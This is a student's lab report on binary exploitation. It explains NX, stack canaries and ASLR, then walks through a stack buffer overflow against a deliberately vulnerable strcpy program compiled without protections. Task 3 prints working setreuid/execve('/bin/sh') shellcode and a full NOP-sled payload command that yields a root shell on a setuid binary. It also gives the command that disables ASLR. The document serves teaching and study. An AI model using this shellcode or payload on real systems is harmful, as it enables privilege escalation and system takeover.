# Lab 2 - Software Testing

> Ahmed Nouralla - a.shaaban@innopolis.university

[TOC]

## Task 1 - Theory

1. **What binary exploitation mitigation techniques do you know?**
   - **NX (No-eXecute) / DEP (Data Execution Prevention)**:
     - Marks certain memory regions (stack, heap) as non-executable.
     - Even if an exploit code was injected into memory, it will not be executed if the region is marked with NX bit.
   - **Stack Canaries**: 
     - Canary is a random value placed on the stack between local variables of a function and the saved return address/base pointer.
     - Before the function returns, OS checks if the canary is corrupted (overwritten), it it's the case, program abruptly terminates with an error `stack smashing detected`, preventing exploitation.
   - **ASLR (Address Space Layout Randomization)**:
     - Randomizes the memory layout of a program each time it runs (changing base addresses of the stack, heap, and libraries)
     - This makes it more difficult for an attacker to predict the location of specific areas and craft malicious payloads to read/write them.
   - **Control Flow Integrity (CFI)**:
     - Techniques to ensures that code execution follows legitimate (expected) flow and does not jump to unintended memory locations.
2. **Does NX solve all binary attacks? Why?**
   - No, several concerns and exploitation techniques should be considered.
   - Return-Oriented Programming (ROP) bypasses NX by reusing existing code ("gadgets") in executable sections to execute a crafted sequence of existing benign instructions.
   - JIT spraying may also bypass NX since the code generated by a JIT compiler is marked as executable for performance. 
   - Information leakage (e.g., from format string vulnerabilities) is also possible even with NX in place.
3. **Why do stack canaries end with 00?**
   - Strings (character arrays) in C has to end with the null-terminator `'\0'`
   - This is useful (for example) when passing a `char*` to a `printf` call, the program knows when to stop processing the string.
   - Having stack canaries end with 00 will null-terminate any string, mitigating string-based buffer overflow (e.g., with `strcpy` or `gets`)
4. **What is NOP sled?**
   - A sequence of NOP (no-operation) instructions that basically tell the CPU to do nothing and go further.
   - This is commonly used when exploiting buffer overflows: a sequence of NOPs before a malicious payload will slide the execution into the targeted area so the overwritten return address doesn't have to be precise and there would be a higher chance of success.

## Task 2 - Warm Up

**Question:** Why in the `warm_up` binary, opposite to the `sample64` from previous lab, the value of `i` doesn't change even if our input was very long?

- Result of running both binaries and supplying the same long string input.

  ![image-20250409224638001](https://i.imgur.com/WnDtx7w.png)

- The first binary is vulnerable to a simple buffer overflow due to using the insecure `gets` function which does not do bound checking before copying a user-supplied string to the buffer, overwriting adjacent memory addresses, and resulting in the value of `i` getting updated. This behavior and logic is confirmed from the decompilation (and disassembly) of the binary

  ![image-20250409233355594](https://i.imgur.com/wW1jsBJ.png)

- The second binary terminates with an error without overwriting the value of `i`. Decompilation of `sample_function` is similar to the first case, except it has additional canary code (see above theory).

  ![image-20250409233255864](https://i.imgur.com/9hUIZPJ.png)

- Explanation
  - Offset `0x28` from `in_FS_OFFSET` typically holds the stack canary value (stored in `local_10` above).
  - If (by the end of function execution) the canary value was changed, the logic jumps to predefined function `__stack_chk_fail()` to terminate the program with an error).
- Conclusion
  - The first binary (if compiled with `gcc`) was probably compiled with flag `-fno-stack-protector`, disabling stack canaries, while the second one was not.

> Observation: the provided `warm_up` binary is identical to `sample64-2` binary from lab 1 (confirmed with `cmp` tool), making this question identical to task `3f` from that lab.

## Task 3 - Buffer Overflow

1. Create a new file `source.c`

   ```c
   #include <stdio.h>
   #include <string.h>
   
   int main(int argc, char *argv[]) {
       char buf[128];
       strcpy(buf, argv[1]);
       printf("%s\n", buf);
       return 0;
   }
   ```

2. Compile the file with this command

   ```bash
   gcc -o binary -no-pie -fno-stack-protector -m32 -z execstack source.c
   ```

   - `-fno-stack-protector`: compile without stack protector to make exploitation possible.

   - `-z execstack`: linker allows the execution of code present on the stack. Without it, execution of injected payloads won't be allowed.

   - `-m32` can be used on 64-bit systems to tell `gcc` to compile binary in 32-bit mode.
     - The assembly code of the program will be using 32-bit memory addresses, `esp` register instead of `rsp`, etc.
     - Need to install `gcc-multilib` dependencies for cross-compiling to use this flag.
     
   - `-no-pie` will not generate a Position-Independent Executable (Compile-time feature) to get a static entry point address.

     ![image-20250412191448956](https://i.imgur.com/BUUWw3X.png)

1. Disable ASLR to make exploitation possible

   ```bash
   sudo sysctl -w kernel.randomize_va_space=0
   cat /proc/sys/kernel/randomize_va_space # verify "0"
   ```

1. The downloaded binary (from drive) is exploit-equivalent to the one compiled locally. This can be verified with `checksec`

   ![image-20250410005500578](https://i.imgur.com/NPE4llY.png)

1. Using `gdb` to disassemble the binary `gdb -q task3`

1. Disassembling main

   ![image-20250410045950134](https://i.imgur.com/2QRjimD.png)

7. Target function `strcpy` is vulnerable to buffer overflow

   - The call is located at the shown address `*main+31`
   - The next `lea` instruction below it is located at `*main+36`

   - Goal: to jump over that instruction to the location of our shellcode payload.

     ```assembly
        0x0804846c <+31>:    call   0x8048310 <strcpy@plt>
        0x08048471 <+36>:    lea    0x10(%esp),%ea
     ```

7. Set a breakpoint after calling `strcpy`

   ```bash
   (gdb) break *main+36
   ```

7. Run the program, supplying an input of size 128 (buffer size).

   - Using Python to generate the input of `a` letters (`0x41` in hex).

   ![image-20250410050141796](https://i.imgur.com/L11rT19.png)

10. Examine the stack, showing 100 addresses around `esp`.

    ![image-20250410050240870](https://i.imgur.com/gFmiV1l.png)

11. Fuzz the program, trying different size payloads till we get a segfault. 

    - First segfault occurs when payload length is 140.

    - When the payload length becomes 141, we start overwriting the return address with `0x41` from right to left as shown in blue. When it becomes 144, we completely overwrite return address.

      ![image-20250410044852081](https://i.imgur.com/mEulAye.png)

12. Exploit should be in the format `[NOP]...[NOP][EXPLOIT][RET]...[RET]`

    - `NOP = '\x90'` is like the `pass` instructions in Python (does nothing and moves on).

    - `RET` is the address that should point somewhere in the middle of the `NOP` sled.

      - Overwritten EIP will jump to destined address, then slide to execute the shell.
      - We may repeat it multiple times to increase chance of success in case things move around.

    - `EXPLOIT` is a encoded x86 machine instructions to run a shell (`/bin/sh`)

      ```assembly
      \x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68
      ```

      ```assembly
      xor eax, eax          ; 31 c0    (Clear EAX)
      mov al, 0x46          ; b0 46    (Set AL = 70 for setreuid)
      xor ebx, ebx          ; 31 db    (Clear EBX = root)
      xor ecx, ecx          ; 31 c9    (Clear ECX)
      int 0x80              ; cd 80    (Syscall: setreuid(0, 0))
      jmp 0x16              ; eb 16    (Jump to "/bin/sh" string)
      pop ebx               ; 5b       (Load "/bin/sh" address into EBX)
      mov [ebx+7], al       ; 88 43 07 (Null-terminate the string)
      mov [ebx+8], ebx      ; 89 5b 08 (Argv[0] = "/bin/sh" address)
      mov [ebx+12], eax     ; 89 43 0c (Argv[1] = NULL)
      mov al, 0x0b          ; b0 0b    (Syscall 11 = execve)
      lea ecx, [ebx+8]      ; 8d 4b 08 (ECX = argv)
      lea edx, [ebx+12]     ; 8d 53 0c (EDX = envp)
      int 0x80              ; cd 80    (Syscall: execve("/bin/sh", argv, NULL))
      call 0xffffffeb       ; e8 e5 ff ff ff (Call backward to the "pop ebx")
      .string "/bin/sh"     ; 2f 62 69 6e 2f 73 68 (ASCII for "/bin/sh")
      ```

13. Construct a NOP sled

    - There should be `buffer_size - exploit_length = 128 - 46 = 82` of `NOP` instructions in the exploit.

13. Run the exploit to obtain a shell

    ```bash
    run $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x90" * 82 + b"\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x16\x5b\x31\xc0\x88\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68" + b"\xa8\xcf\xff\xff" * 20)')
    ```

    ![image-20250410034437174](https://i.imgur.com/pyxLYj5.png)

15. To get a root shell, the binary has to have the `setuid` bit

    - For the demo, we can set it with `sudo chmod u+s ./task3`

    - Then re-execute the exploit.

      ![image-20250410051644966](https://i.imgur.com/2BV630o.png)

16. [Bonus] It's indeed possible to have the exploit only working in GDB but not outside it because  [[ref.](https://stackoverflow.com/questions/17775186/buffer-overflow-works-in-gdb-but-not-without-it)] OS places environment variables and program arguments *before* the start address of the stack, shifting the addresses and thus requiring different payloads to run a successful exploit.

